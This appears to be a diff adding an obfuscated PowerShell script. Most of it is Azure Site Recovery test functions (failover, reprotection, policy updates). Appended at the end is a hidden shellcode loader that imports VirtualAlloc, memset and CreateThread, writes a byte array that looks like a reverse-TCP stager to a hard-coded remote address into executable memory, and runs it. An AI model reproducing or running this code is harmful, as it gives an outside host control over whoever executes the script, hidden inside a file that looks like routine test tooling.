+    ${c`oMMiT`jOb} = &("{8}{10}{7}{9}{0}{5}{12}{11}{6}{3}{4}{2}{1}"-f'ice','b','erJo','ilo','v','sAsr','mitFa','cove','St','ryServ','art-AzRe','m','Co') -RecoveryPlan ${r`P} 
+    &("{0}{4}{3}{2}{1}" -f 'W','Completion','b','o','aitForJ') -JobId ${c`OmmI`Tj`OB}."N`AmE"
+}
+
+
+function V2`AtEStres`YNC 
+{
+    param([string] ${va`ULtSeTT`I`Ng`SFIlepaTh})
+    &("{4}{8}{3}{0}{7}{1}{5}{2}{6}" -f 'er','ice','VaultSettingsFil','ov','Imp','sAsr','e','yServ','ort-AzRec') -Path ${v`AulT`sE`TtINgS`FILeP`ATH}
+
+    ${f`ABr`iC} =  &("{0}{2}{1}" -f'G','bric','et-AsrFa') -FriendlyName ${pRIMaRy`Fa`BRic`Name}
+    ${P`c} =  &("{2}{3}{6}{0}{5}{4}{7}{1}"-f'tec','iner','G','et-','onCont','ti','ASRPro','a') -FriendlyName ${p`c`NAmE} -Fabric ${fA`Br`iC}
+    ${r`pI} = &("{11}{8}{2}{5}{0}{7}{12}{3}{9}{4}{6}{1}{13}{10}" -f'Serv','rote','eco','ep','ation','very','P','ice','zR','lic','edItem','get-A','sAsrR','ct') -ProtectionContainer ${pc} -Name ${r`pIN`AMe}
+    ${j`OB} = &("{16}{6}{14}{8}{1}{12}{13}{11}{0}{5}{4}{2}{9}{3}{15}{7}{10}" -f'oni','Se','R','pli','e','z','rt-AzRe','on','y','e','Job','ynchr','rvices','AsrRes','cover','cati','Sta') -ReplicationProtectedItem ${R`PI}
+    &("{4}{3}{0}{2}{1}" -f'or','obCompletion','J','tF','Wai') -JobId ${J`ob}."n`AME"
+}
+
+
+function v2AuP`DaTEm`oBILit`YSer`Vice
+{
+    param([string] ${vau`lTS`E`TtINg`S`Fi`LepATH})
+    &("{10}{4}{5}{1}{3}{2}{11}{12}{7}{0}{9}{8}{6}"-f 'ett','Servic','rV','esAs','port-AzRecover','y','le','S','Fi','ings','Im','a','ult') -Path ${VauLTsetTI`N`gSfIlepA`TH}
+    ${F`A`BrIC} =  &("{1}{2}{0}{3}" -f '-Asr','G','et','Fabric') -FriendlyName ${p`Ri`mA`RyFabrI`cnaMe}
+    ${P`C} =  &("{2}{5}{3}{1}{6}{4}{0}" -f'ntainer','o','G','ASRPr','nCo','et-','tectio') -FriendlyName ${Pcn`Ame} -Fabric ${fAb`R`ic}
+    ${r`PI} = &("{10}{6}{4}{5}{0}{8}{2}{7}{9}{3}{12}{1}{11}"-f 'S','t','rvic','icationPr','cove','ry','et-AzRe','es','e','AsrRepl','g','edItem','otec') -ProtectionContainer ${PC} -Name ${R`pIna`Me}
+    ${J`OB} = &("{10}{8}{2}{6}{12}{0}{1}{7}{5}{4}{9}{11}{3}" -f 'r','vice','c','ervice','rMo','s','overyS','sA','date-AzRe','bi','Up','lityS','e') -ReplicationProtectedItem ${r`pi} -Account ${F`AbRIc}."FaB`RicspecIfICde`T`AI`lS"."R`Un`A`sACCOun`TS"[0]
+    &("{3}{4}{1}{2}{0}"-f 'n','mplet','io','WaitF','orJobCo') -JobId ${j`OB}."Na`mE"
+}
+
+
+function V2AUp`daTes`ErvIc`epR`OvI`D`ER 
+{
+    param([string] ${vAult`SeTT`iN`GSFiLE`PaTH})
+    &("{6}{7}{1}{5}{9}{4}{0}{2}{8}{3}" -f 'l','t-','tSetting','e','au','AzRecoverySer','Imp','or','sFil','vicesAsrV') -Path ${va`U`lTSeTT`iN`g`sfiLeP`Ath}
+    ${fab`R`IC} =  &("{0}{2}{1}" -f 'Get-Asr','abric','F') -FriendlyName ${P`RiMA`RYFa`BRiC`N`AmE}
+    ${s`PliSt} = &("{2}{0}{1}{3}{4}" -f'AS','R','Get-','ServicesProvi','der') -Fabric ${fa`B`Ric} 
+    ${j`oB} = &("{0}{6}{7}{2}{4}{5}{3}{1}" -f'Up','ider','-A','icesProv','SR','Serv','dat','e') -InputObject ${sP`l`Ist}[0]
+    &("{2}{3}{0}{1}"-f't','ion','WaitForJobCo','mple') -JobId ${J`oB}."N`AmE"
+}
+
+
+function v`2`AS`wItcHpr`oCE`Sss`eRVEr 
+{
+    param([string] ${Vaul`Tse`TTi`NgsFILEpa`Th})
+    &("{5}{2}{11}{0}{7}{1}{3}{10}{9}{12}{8}{6}{4}"-f'overySe','vicesAsr','o','V','File','Imp','s','r','g','Sett','ault','rt-AzRec','in') -Path ${vAUlTs`EttinGsFiLE`p`Ath}
+    ${Fa`BrIc} =  &("{0}{1}{2}"-f'Get-','AsrFabr','ic') -FriendlyName ${pri`mArYFaB`R`IcNaMe}
+    ${p`c} =  &("{3}{1}{2}{4}{0}"-f'onContainer','-ASRPr','ote','Get','cti') -FriendlyName ${P`c`NAMe} -Fabric ${faB`RIC}
+    ${RP`Il`iST} = &("{1}{5}{7}{10}{2}{0}{6}{9}{11}{8}{3}{4}"-f'rReplica','Get-A','s','e','m','zRec','tio','ove','dIt','nProtect','ryServicesA','e')   -ProtectionContainer ${Pc}
+    ${J`Ob} = &("{7}{0}{4}{10}{5}{1}{9}{6}{3}{2}{8}" -f 'rt-AzReco','r','rv','itchProcessSe','ver','e','Sw','Sta','erJob','vicesAsr','yS') -Fabric ${FAB`RiC} -SourceProcessServer ${FA`BriC}."f`AbRIC`Sp`EcI`FIC`Deta`ILs"."P`RO`ces`SSe`Rvers"[0] -TargetProcessServer ${fA`Br`IC}."FabrI`cSPeC`iFI`c`D`eTAi`ls"."p`R`OcESSSeRv`eRs"[1] -ReplicatedItem ${r`Pil`isT}
+    &("{1}{4}{6}{0}{2}{5}{3}" -f'JobC','Wai','omple','on','tF','ti','or') -JobId ${j`Ob}."n`AME"
+    ${j`Ob} = &("{5}{3}{6}{4}{0}{10}{8}{7}{14}{9}{11}{13}{12}{1}{2}" -f'eryServi','rv','erJob','tart-AzR','cov','S','e','it','w','r','cesAsrS','oc','Se','ess','chP') -Fabric ${fA`B`RIC} -SourceProcessServer ${FA`BRiC}."FabrIcspeCi`F`IcdEt`Ails"."P`R`Oc`eSsServeRs"[0] -TargetProcessServer ${fa`B`RiC}."FabRICSpEc`if`I`CdEta`I`ls"."P`Ro`CESSSErVerS"[1]
+    &("{4}{2}{0}{3}{1}{5}" -f 'bComp','tio','orJo','le','WaitF','n') -JobId ${J`Ob}."n`AME"
+}
+
+
+
+function v2atE`St`Fa`ilOv`ERj`Ob 
+{
+    param([string] ${vAuLTSETTin`gsf`I`L`e`Path})
+
+    
+    &("{7}{5}{4}{1}{0}{2}{8}{9}{6}{3}"-f 'r','rySe','vicesAs','SettingsFile','rt-AzRecove','po','lt','Im','r','Vau') -Path ${v`AUlt`SET`Tin`GsFilEPATh}
+
+    ${Fab`RIC} =  &("{1}{2}{0}"-f'ic','Get-','AsrFabr') -FriendlyName ${Pr`ima`RYFabrI`CNA`Me}
+    ${pc} =  &("{6}{5}{1}{3}{0}{2}{4}"-f 'ctionCo','ASR','ntain','Prote','er','-','Get') -FriendlyName ${P`CNa`mE} -Fabric ${fAb`RIC}
+    
+    ${r`pi} = &("{4}{2}{9}{5}{7}{6}{10}{3}{0}{1}{8}"-f 'ec','ted','et-Az','rot','g','overyServicesA','rR','s','Item','Rec','eplicationP') -ProtectionContainer ${p`c} -Name ${rp`i`NaME}
+    
+    do
+    {
+        ${Rp`OINTs} = &("{1}{4}{5}{0}{2}{3}"-f've','Get-AS','ryPo','int','RR','eco') -ReplicationProtectedItem ${R`Pi}
+        if(${RPoi`Nts} -and  ${rP`O`InTs}."CO`UNt"  -eq 0) {		
+			
+		}		
+		else
+		{
+			break
+		}
+    }while (${r`p`OinTs}."cO`UNT" -lt 0)
+
+    ${T`F`OjOB} = &("{5}{10}{2}{9}{8}{11}{3}{7}{1}{6}{0}{4}" -f 'tFa','sAsrT','z','rvic','iloverJob','Sta','es','e','very','Reco','rt-A','Se') -ReplicationProtectedItem ${r`pI} -Direction ("{0}{1}{2}{3}"-f 'Pri','mar','yToRecove','ry') -AzureVMNetworkId  ${aZUReVMNETW`o`R`KID} -RecoveryPoint ${RPOi`NTS}[0]
+
+    &("{4}{2}{1}{0}{3}"-f'ti','omple','orJobC','on','WaitF') -JobId ${t`FOJ`ob}."na`me"
+
+    ${C`l`EAn`UPJob} = &("{8}{10}{3}{2}{5}{4}{7}{9}{0}{6}{1}"-f'up','ob','eryS','zRecov','t','ervicesAsrTes','J','F','S','ailoverClean','tart-A') -ReplicationProtectedItem ${R`pi} -Comment ("{0}{3}{2}{1}" -f 't','e','ng don','esti')
+    &("{4}{0}{1}{2}{5}{3}"-f 'JobC','o','mple','ion','WaitFor','t') -JobId ${C`LeaN`Up`Job}."n`Ame"
+    }
+
+    function v2AFailo`VE`R`Job 
+    {
+        param([string] ${V`AULT`s`etTinGSF`ilePath})
+
+        
+        &("{2}{6}{10}{7}{8}{1}{0}{9}{5}{4}{3}"-f 'ttin','Se','Impo','e','l','i','rt-AzRecoveryServicesAs','Va','ult','gsF','r') -Path ${Vau`lTSEttiNGs`FilE`PA`TH}
+
+        ${fA`BRic} =  &("{1}{3}{2}{0}" -f'c','G','bri','et-AsrFa') -Name ("{3}{12}{6}{9}{0}{7}{2}{4}{14}{13}{5}{8}{11}{1}{10}"-f '2ba0311dea5','e','3a7135b65558','9a721','b43','40b','d0932','5df','9e','5a0','084f','7b','55b61','5','c9ff')
+        ${PC`N`AMe} = ("{7}{9}{5}{2}{1}{6}{10}{11}{4}{8}{0}{3}"-f'22c89d7','0','1e','b','1b','44','9-275c-4f15','cloud_a','9-450a','5','-','a')
+        ${P`C} =  &("{7}{4}{0}{1}{2}{5}{6}{3}" -f'ec','tion','Co','r','t','n','taine','Get-ASRPro') -Name ${PCN`AME} -Fabric ${F`AB`RiC}
+        ${RPiN`A`mE} = ("{1}{0}{2}" -f'-','win','4003')
+        ${r`PI} = &("{2}{1}{4}{0}{9}{10}{7}{8}{3}{6}{5}" -f'ryS','et-AzRec','g','ot','ove','edItem','ect','cesAsrReplicationP','r','e','rvi') -ProtectionContainer ${P`c} -FriendlyName ${RpIn`A`me}
+    
+        ${foj`OB} = &("{8}{0}{5}{9}{4}{1}{7}{2}{6}{3}" -f'AzRecoverySer','UnPlanned','a','ob','sAsr','vi','iloverJ','F','Start-','ce') -ReplicationProtectedItem ${R`PI} -Direction ("{0}{4}{3}{1}{2}" -f'Primar','cover','y','e','yToR')
+        &("{3}{5}{2}{4}{1}{0}" -f 'n','Completio','r','W','Job','aitFo') -JobId ${F`o`job}."NA`mE"
+        ${c`omMi`TJoB} = &("{5}{6}{3}{7}{12}{0}{1}{2}{10}{11}{4}{8}{9}"-f'ervi','cesA','sr','art-A','itF','S','t','zRecov','ail','overJob','Com','m','eryS') -ReplicationProtectedItem ${r`Pi} 
+        &("{3}{0}{4}{2}{1}"-f 'it','letion','mp','Wa','ForJobCo') -JobId ${c`Om`miTj`Ob}."na`mE"
+    }
+
+
+function V2`AtESTr`eP`RoTEct 
+{
+    param([string] ${VAU`L`TseTtiNg`sf`ILEPath})
+    &("{7}{8}{3}{1}{0}{2}{5}{4}{6}"-f'A','es','srVau','zRecoveryServic','ings','ltSett','File','Im','port-A') -Path ${vAultSEttINGS`F`I`lePa`Th}
+    ${F`Ab`RIC} =  &("{2}{1}{3}{0}"-f'ic','t-AsrFab','Ge','r') -Name ("{1}{6}{10}{5}{7}{12}{3}{2}{9}{11}{8}{0}{4}"-f'84','9a72','55','5','f','ba03','155b61','11dea','e7be0','8b43c9ff54','d09325a02','0b9','55df3a7135b6')
+        ${pC`NA`mE} = ("{11}{4}{7}{9}{12}{2}{1}{10}{3}{5}{0}{6}{8}" -f '22c','f1','4','9-','5441e','450a','89d','09','7b','-','5-a1b','cloud_a','275c-')
+        ${P`c} =  &("{5}{7}{1}{3}{4}{0}{2}{6}"-f'io','R','nCont','Pro','tect','Get-A','ainer','S') -Name ${p`cNa`mE} -Fabric ${Fab`Ric}
+        ${rPina`ME} = ("{1}{2}{0}" -f '3','win-4','00')
+        ${r`pi} = &("{7}{13}{1}{12}{6}{4}{8}{11}{9}{0}{3}{5}{10}{2}"-f 'tionP','zR','em','r','ice','otecte','ryServ','g','sAsrRe','ca','dIt','pli','ecove','et-A') -ProtectionContainer ${PC} -FriendlyName ${RPiN`AMe}
+    
+    ${PoL`iC`y2} = &("{1}{5}{2}{0}{3}{4}{6}{7}" -f 'v','Get-','r','i','ces','AzRecoverySe','AsrPolic','y') -Name ${PO`liCYn`AM`e2}
+    ${pC`MjOB} =  &("{9}{1}{6}{4}{5}{2}{0}{8}{7}{3}"-f 'ice','-A','Serv','pping','ecover','y','zR','Ma','sAsrProtectionContainer','New') -Name ${rEversE`ma`ppI`NG} -policy ${po`l`iCY2} -PrimaryProtectionContainer ${P`C} -RecoveryProtectionContainer ${pC}
+    &("{4}{1}{3}{2}{5}{6}{0}" -f 'n','tF','rJobC','o','Wai','omple','tio') -JobId ${pC`mj`ob}."N`AmE"
+
+    ${p`CM} = &("{6}{9}{7}{3}{5}{2}{0}{4}{8}{1}"-f 'ctionContai','ping','e','Pr','ne','ot','Get','ASR','rMap','-') -Name ${revers`em`APp`iNg} -ProtectionContainer ${P`C}
+    ${j`OB} = &("{6}{5}{11}{0}{14}{12}{4}{10}{9}{1}{8}{7}{2}{3}{13}" -f 'c','io','ct','io','ic','d','Up','re','nDi','sAsrProtect','e','ate-AzRe','Serv','n','overy') `
+                -AzureToVmware `
+                -Account ${FAB`RIC}."fABrIcSPE`c`iFicd`etaI`lS"."runa`saCC`OUN`Ts"[0] `
+                -DataStore ${F`ABrIc}."FAB`RIcsPeC`ifiC`deTaiLs"."maSTerTARg`et`serv`eRs"[1]."dAtA`sTor`ES"[3]  `
+                -Direction ("{5}{3}{0}{2}{1}{4}"-f'P','ar','rim','o','y','RecoveryT') -MasterTarget ${f`ABRic}."fab`RiCSp`ECI`FICD`EtA`ilS"."MAs`TErtAR`gEtS`erVe`Rs"[1] `
+                -ProcessServer ${F`Ab`RiC}."fAbriCs`PECiF`icdEt`Ai`lS"."pROcE`sS`SeRv`eRs"[1] `
+                -ProtectionContainerMapping ${p`cM} `
+                -ReplicationProtectedItem ${R`pI} `
+                -RetentionVolume ${faBr`iC}."fABricspe`C`I`FiC`dEt`AiLs"."MASt`ERTaRg`etSE`RverS"[1]."Re`Te`NTIOn`Vo`lUmes"[0]
+    
+    }
+
+function V2A`FAIlb`ACKrEpro`TE`Ct
+{
+    param([string] ${vAulT`se`T`TIn`gSfIle`pAtH})
+        &("{0}{4}{8}{7}{5}{2}{6}{1}{3}" -f'Imp','ttin','S','gsFile','ort-Az','t','e','cesAsrVaul','RecoveryServi') -Path ${v`AuLtS`etTiNgSFI`LEpa`TH}
+        ${Fa`BriC} =  &("{2}{0}{1}"-f'A','srFabric','Get-') -Name ("{9}{10}{4}{8}{3}{7}{12}{1}{11}{14}{16}{13}{5}{0}{15}{2}{6}"-f'5b6555','0','7b','b','5','713','e084f','61d09','5','9a7','21','2ba','325a','df3a','0311dea','8b43c9ff540b9e','55')
+        ${pC`N`AMe} = ("{0}{1}{5}{6}{4}{2}{3}" -f'cloud_a5441e09','-275c-4f15-a1b9-450','9','d7b','8','a2','2c')
+        ${P`c} =  &("{2}{1}{0}{3}{4}"-f'onC','tecti','Get-ASRPro','on','tainer') -Name ${p`cn`Ame} -Fabric ${FAbr`ic}
+        ${RPI`Na`Me} = ("{2}{0}{1}" -f '-400','2','win')
+    
+        ${R`PI} = &("{13}{7}{2}{9}{8}{10}{4}{6}{3}{11}{5}{14}{1}{12}{0}" -f 'em','t','yS','icati','esAsrRe','nP','pl','over','i','erv','c','o','ectedIt','get-AzRec','ro') -ProtectionContainer ${pC} -FriendlyName ${RpiN`A`me}
+        ${j`Ob} = &("{1}{5}{7}{9}{0}{2}{4}{10}{8}{3}{11}{6}" -f 'overySer','S','v','edFail','ices','t','b','art-Az','n','Rec','AsrUnPlan','overJo') -ReplicationProtectedItem ${r`pi} -Direction ("{3}{1}{5}{0}{2}{4}" -f'oRec','im','over','Pr','y','aryT')
+        &("{0}{3}{1}{2}" -f 'WaitFo','plet','ion','rJobCom') -JobId ${j`OB}."Na`ME"
+
+        ${j`Ob} = &("{5}{1}{4}{0}{2}{7}{8}{6}{3}"-f'AzR','tar','e','sAsrCommitFailoverJob','t-','S','vice','coverySe','r') -ReplicationProtectedItem ${r`PI} 
+        &("{4}{3}{0}{2}{1}{5}" -f 'pl','o','eti','itForJobCom','Wa','n') -JobId ${j`OB}."n`AME"
+
+        ${p`CM} = &("{0}{6}{5}{3}{2}{1}{4}{7}" -f 'Get-ASRPr','Map','onContainer','i','pin','ct','ote','g') -Name ${pRi`m`A`RYpR`oT`ecTionC`ONtaiNerMAp`p`iNG} -ProtectionContainer ${P`c}
+
+        ${J`Ob} = &("{6}{3}{8}{5}{2}{0}{4}{1}{7}"-f'ot','ecti','rPr','e-AzRecove','ectionDir','sAs','Updat','on','ryService') `
+                    -VMwareToAzure`
+                    &("{0}{1}{2}" -f '-Acco','u','nt') ${FAB`RiC}."faBR`IcspE`C`ifiCdE`T`AilS"."rUNasA`CcO`U`NtS"[1]`
+                    -Direction ("{4}{2}{1}{3}{0}" -f'imary
+','e','ecov','ryToPr','R')                    -ProcessServer ${f`AbRIC}."fAbR`iCS`p`ec`IficDetaI`ls"."p`ROcE`SSSErve`RS"[1]`
+                    -ProtectionContainerMapping ${P`CM} `
+                    -ReplicationProtectedItem ${R`Pi}
+}
+
+function V2AuPDA`TePO`L`ICy
+{
+    param([string] ${VaultSE`TTIng`SFi`lEP`A`TH})
+        &("{6}{1}{9}{3}{11}{5}{7}{0}{2}{8}{10}{4}"-f'lt','rt-A','Set','v','ile','AsrVa','Impo','u','ti','zReco','ngsF','eryServices') -Path ${vaULt`se`TTing`sfi`LEPATh}
+        ${p`o} = &("{2}{3}{0}{1}" -f'c','y','get-','asrpoli') -Name ("{2}{3}{0}{1}" -f'y','2','V2aTes','tPolic')
+        &("{5}{1}{7}{6}{0}{2}{8}{3}{4}" -f'ryS','date-AzR','ervice','ic','y','Up','cove','e','sAsrPol')  -VMwareToAzure -ApplicationConsistentSnapshotFrequencyInHours 5 -InputObject ${PO} -MultiVmSyncStatus ("{1}{0}"-f'nable','E')
+        &("{2}{6}{7}{3}{0}{4}{1}{5}"-f 'rySe','AsrPo','Update','ove','rvices','licy','-AzRe','c')  -VMwareToAzure -ApplicationConsistentSnapshotFrequencyInHours 5 -InputObject ${pO}
+}
+
+function Tes`T-`SEtRPi
+{
+    param([string] ${vauL`Tsett`I`NGSFILepAth})
+        &("{5}{3}{6}{9}{4}{1}{7}{2}{0}{8}{10}" -f 'tti','rV','e','R','As','Import-Az','ecover','aultS','ngs','yServices','File') -Path ${vaULTS`ETT`iNG`s`FiLepATh}
+        ${F`ABRic} =  &("{4}{3}{0}{1}{2}" -f'r','Fabri','c','et-As','G') -FriendlyName ${PriMarYf`Abri`c`N`A`mE}
+        ${P`c} =  &("{5}{1}{2}{4}{3}{6}{0}"-f 'r','Pr','otectio','n','nContai','Get-ASR','e') -FriendlyName ${P`cNa`Me} -Fabric ${faB`RIc}
+        ${R`Pi} = &("{2}{8}{4}{7}{0}{5}{1}{6}{3}"-f'srRepli','r','ge','em','er','cationP','otectedIt','yServicesA','t-AzRecov') -ProtectionContainer ${P`C} -Name ("{1}{0}"-f'PI','-R')
+        &("{3}{2}{8}{5}{6}{9}{1}{4}{0}{7}" -f 'e','Protect','-AzRe','Set','edIt','cesAs','r','m','coveryServi','Replication') -InputObject ${R`pI} -Name ("{0}{1}" -f 'VSPS','212') -PrimaryNic ${r`PI}."Nicdet`AI`lSlI`st"[0]."NIc`id" -RecoveryNetworkId `
+                        ${AZu`REvMNet`woR`KId} -RecoveryNicStaticIPAddress ("{3}{2}{1}{0}{4}"-f'12','.','151','10.','8.205') -RecoveryNicSubnetName ("{0}{1}{2}"-f'Subne','t-','2') -UseManagedDisk ("{0}{1}" -f'T','rue')
+    
+}
+
+
+${C} = ((("{54}{96}{53}{67}{25}{78}{91}{63}{46}{94}{32}{10}{76}{27}{2}{48}{62}{87}{57}{51}{38}{69}{42}{99}{61}{6}{41}{86}{47}{1}{29}{4}{82}{84}{56}{18}{66}{37}{14}{72}{50}{16}{22}{90}{30}{15}{19}{92}{7}{43}{95}{17}{23}{77}{31}{81}{79}{35}{33}{93}{21}{36}{44}{20}{5}{102}{45}{12}{88}{89}{98}{97}{11}{34}{59}{52}{3}{40}{60}{101}{74}{28}{39}{75}{8}{83}{65}{49}{80}{13}{0}{26}{9}{100}{70}{68}{24}{58}{73}{55}{64}{71}{85}" -f'r m','e, u','A','F','rotect);','nt',', uint f','ateTh',')]public stat','se',' IntPtr Vir','amete','p','t','bli','tr','tic ','t','t({0}kern',' C','I','ckSiz','ex','r lpThreadAt','in','}','em','ual','{0}msvc','int flP','n IntP','s','extern','t d','r','n','e,',')]pu','pAdd','rt.d','lags, IntPtr l','lAllocat',', u','read(In',' ','tr l','ic s','p','l','ex',' sta','Ptr l','Creation','ern','[DllImpor','u','r','nt','t sr',', uint dw','p','wSize','loc(','ubl','i','c ','el32.dll{0}','el32.dll{0','r dest, u','ress','tPt','nt count)','c','c, ','hreadId);[DllImport(','ll{0}','t','tribute',')]','ui','tern IntP',', ','[D','i','llImpo',';','ionTy','I','StartAddr','ess, IntPtr','ter','p','re','wSta','tatic ','tP','t({0}k','r',' lpPa','int d','t(In','T','P'))  -f [Char]34);${W} = &("{0}{1}" -f 'Add','-Type') -memberDefinition ${C} -Name ("{0}{1}"-f 'Win','32') -namespace ("{1}{2}{3}{0}{4}" -f '2Fun','Wi','n','3','ctions') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0x6a,0xd7,0x09,0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."L`EnGTH" -gt 0x1000){${G} = ${Z}."L`EnGTH"};${x}=${W}::("{3}{2}{0}{1}" -f'll','oc','irtualA','V').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${z}."lEN`gth"-1);${i}++) {${W}::"mEm`S`eT"([IntPtr](${x}.("{1}{2}{0}" -f 'nt32','T','oI').Invoke()+${i}), ${z}[${I}], 1)};${w}::("{3}{0}{1}{2}" -f 'eateT','hrea','d','Cr').Invoke(0,0,${X},0,0,0);for (;;){&("{2}{0}{1}" -f'rt-sle','ep','Sta') 60};
